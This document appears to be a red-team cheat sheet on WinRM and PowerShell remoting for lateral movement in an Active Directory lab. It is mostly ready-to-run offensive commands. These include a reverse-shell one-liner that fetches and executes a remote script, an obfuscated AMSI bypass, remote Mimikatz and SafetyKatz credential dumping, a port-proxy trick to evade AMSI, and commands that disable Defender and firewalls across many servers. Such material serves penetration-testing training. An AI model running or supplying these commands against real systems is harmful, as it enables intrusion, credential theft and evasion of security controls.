# WinRM

WinRM stands for Windows Remote Management that allows to perform management tasks on systems remotely, WinRM is available if the port is opened.

WinRM Ports:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Use [PSReadline ](https://github.com/PowerShell/PSReadLine)script to store commands from PowerShell into a clear-text file.

## Enumeration

Find machines with PS Session

[#user-hunting](../ad-enumeration/gnereral.md#user-hunting "mention")

## PS Session

{% hint style="info" %}
PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management.
{% endhint %}

Enable PowerShell Remoting on local system (Requires elevated privileges)

```powershell
Enable-PSRemoting
```

#### Create a session

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
```

#### Enter existing session

```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

# Using session object
Enter-PSSession -Session $sess
```

## Invoke-Command

<pre class="language-powershell"><code class="lang-powershell"># test remoting connection
Invoke-Command -Session $Session -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'
Invoke-Command -Computername Srv01.Security.local -ScriptBlock {Whoami;Hostname}

# Run locally loaded functions on target system
Invoke-Command -Computername Srv01.Security.local -ScriptBlock ${Function:Test-Function}
Invoke-Command -Session $Session -FilePath -ScriptBlock ${Function:Test-Function}

# Load script
Invoke-Command -FilePath 'C:\Tools\Invoke-Mimikatz.ps1' -Session $Session
<strong>Invoke-Command -Computername Srv01.Security.local -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'
</strong>
<strong># Multiple connections
</strong><strong>Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content &#x3C;list_of_servers>) 
</strong></code></pre>

#### Useful script blocks

```powershell
# Language Mode
Invoke-Command -ComputerName <target> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}

# Reverse shell
Invoke-Command -ComputerName Srv01.Security.local -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<IP>/Shell.ps1')"}

#Bypass AMSI
Invoke-Command -session $Session -ScriptBlock {sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )}

# Turns off all firewall profiles
Invoke-Command -ComputerName Srv02.Security.local -ScriptBlock {Set-NetFirewallProfile -Profile "Domain","Public","Private" -Enabled "False"}

# Turns off Defender and Firewall on multiple systems
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true;`
Set-MpPreference -DisableIOAVProtection $true;`
Set-MPPreference -DisableBehaviorMonitoring $true;`
Set-MPPreference -DisableBlockAtFirstSeen $true;`
Set-MPPreference -DisableEmailScanning $true;`
Set-MPPReference -DisableScriptScanning $true;`
Set-MpPreference -DisableIOAVProtection $true;`
Add-MpPreference -ExclusionPath "C:\Windows\Temp";`
Set-NetFirewallProfile -Profile "Domain","Public","Private" -Enabled "False"}`
-ComputerName (Get-Content c:\Serverlist.txt)
```

## Winrs

```powershell
winrs -r:dcorp-mgmt 'whoami & hostname'
winrs -r:server1 -u:server1\administrator -p:Pass@1234 'hostname' # With creds
```

To run any APT tools to the victim machines. It's advised not to store the file as it will be detected by the ASMI. Directly load it into the memory to run it.

```powershell
# Will be detected by ASMI
winrs -r:dcorp-mgmt "cmd /c <remote_file_path> -path HTTP://<ip>/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Check [transfer-files.md](../misc/transfer-files.md "mention") to get to know more about transfering the files. Use winrs like below to evade ASMI.

```powershell
# Setup proxy
$null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1”
# Transfer files
$null | winrs -r:dcorp-mgmt “cmd /c <path_to_tool> -path HTTP://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit”
```
